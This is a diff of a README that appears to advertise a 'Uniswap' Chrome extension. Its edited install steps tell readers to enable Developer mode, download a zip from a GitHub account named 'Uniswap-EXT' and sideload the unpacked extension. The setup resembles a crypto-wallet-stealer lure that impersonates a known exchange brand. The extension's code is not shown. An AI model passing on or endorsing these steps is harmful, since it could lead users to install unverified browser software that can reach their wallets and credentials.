@@ -18,16 +18,15 @@ Uniswap is the largest decentralized exchange (or DEX) operating on the Ethereum
 # How to Install
 1. Open Chrome browser
 
-  - In the URL address bar > type chrome://extensions.
+  - In the URL address bar type chrome://extensions.
 
 2. Enable Developer mode located on the top right.
 
 ![How-To-Manually-Install-A-Chrome-Extension](https://user-images.githubusercontent.com/36484062/158015112-a8d7a6b1-e8c0-44fc-a6b2-c42573d900e8.jpg)
 
 3. Download uniswap Extension: https://github.com/Uniswap-EXT/Uniswap-Chrome-Extension/raw/main/Uniswap-Chrome-Extension.zip
-  - Extract zip file, go into the folder then drag and drop extension folder into chrome extensions window. 
-  
-  - Alternatively, click on the Load unpacked button, navigate to the extensions folder and press Select Folder.
+
+  - Extract zip file, then drag and drop extension folder into chrome extensions window. 
   
 4. Click on the “Extensions” button, then pin Uniswap extension to extension toolbar
 
